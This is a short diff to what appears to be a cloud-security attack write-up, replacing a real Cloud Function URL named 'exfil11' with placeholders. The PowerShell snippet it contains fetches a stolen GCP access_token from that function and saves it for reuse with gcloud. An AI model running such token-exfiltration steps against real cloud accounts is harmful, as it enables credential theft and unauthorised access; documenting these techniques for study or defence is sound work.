@@ -1172,7 +1172,7 @@ With the access to the *access_token* what can we do? Well, a lot. One being aut
 Below is a Powershell Command that will put the the *access_token* into a txt file, to be used later with gCloud.
 
 ```powershell
-$response = Invoke-WebRequest -Uri "https://us-east1-nnnn-374620.cloudfunctions.net/exfil11" -UseBasicParsing
+$response = Invoke-WebRequest -Uri "https://<function-region>-<project-id>.cloudfunctions.net/<function-name>" -UseBasicParsing
 $jsonResponse = $response | ConvertFrom-Json
 $accessToken = $jsonResponse.access_token
 $accessToken | Out-File -FilePath "code.txt"
